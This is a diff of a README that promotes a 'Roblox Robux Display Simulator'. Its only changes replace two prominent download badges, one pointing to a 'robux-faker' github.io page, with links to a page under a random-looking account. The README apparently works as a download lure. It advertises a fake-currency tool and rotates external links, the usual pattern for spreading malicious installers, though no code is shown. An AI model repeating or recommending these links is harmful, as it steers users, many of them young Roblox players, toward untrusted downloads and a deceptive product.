@@ -1,7 +1,7 @@
 # 💎 Roblox Robux Display Simulator — Visual Balance UI Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkgreen?style=for-the-badge)](https://roblox-robux-faker-simulator.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://roblox-robux-faker-simulator.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkgreen?style=for-the-badge)](https://egiqilaqoq44.github.io/.github/roblox-robux-simulator)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://egiqilaqoq44.github.io/.github/roblox-robux-simulator)
 
 ---
                                (  .  (    (  (   .  (   (    
